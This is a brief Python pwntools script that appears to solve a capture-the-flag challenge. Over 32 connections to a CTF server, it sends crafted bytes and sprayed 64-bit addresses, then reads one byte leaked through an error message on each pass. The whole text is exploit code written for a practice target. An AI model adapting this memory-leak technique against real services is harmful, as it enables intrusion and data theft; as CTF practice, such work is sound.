from pwn import *


for i in range(32):

    p = remote('ctf.pwn.sg', 4001)

    pause()
    p.sendafter("Do you want to flip the flag switch? (y/n) ", '\x44\xC5')
    p.send(p64(0x700B1000+i*32)*(0xff/8+1))

    pause()
    p.send("\x00\n")

    p.recvuntil('Error: ')
    print(p.recv(1))


